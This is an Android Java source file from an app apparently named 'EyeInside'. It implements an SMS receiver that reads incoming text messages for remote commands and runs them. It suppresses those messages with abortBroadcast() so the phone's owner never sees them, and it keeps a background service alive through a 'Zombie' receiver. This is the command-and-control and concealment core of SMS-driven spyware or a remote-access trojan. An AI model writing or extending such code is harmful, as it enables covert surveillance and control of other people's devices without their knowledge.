package com.code4bones.EyeInside;

import com.code4bones.utils.NetLog;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsMessage;

public class SMS_BroadcastReceiver extends BroadcastReceiver {

	final  private Handler mHandler  = new Handler();
	final  public static CommandPool mPool = CommandPool.getInstance();
	
	public SMS_BroadcastReceiver() {
	}

	@Override
	public void onReceive(Context context, Intent intent) {

		
		// Alwaus keep out service running
		Zombie_BroadcastReceiver.startServiceIfNeeded(context);

		
		Bundle extras = intent.getExtras();
		if ( extras == null ) {
			NetLog.v("SMS have no Extras() !");
			return;
		}
		
		boolean isCommand = false;
				
		Object[] objExtra = (Object[])extras.get("pdus");
		for ( Object smsx : objExtra ) {
			SmsMessage sms = SmsMessage.createFromPdu((byte[])smsx);
			String message = sms.getMessageBody().trim();
			
			if ( !CommandObj.isCommand(message) ) 
				continue;
			
			
			
			mHandler.post(new CommandInvoker(context,mPool,sms.getOriginatingAddress(),message));
			isCommand = true;
		}
		if ( isCommand )
			this.abortBroadcast();
	}

	
}
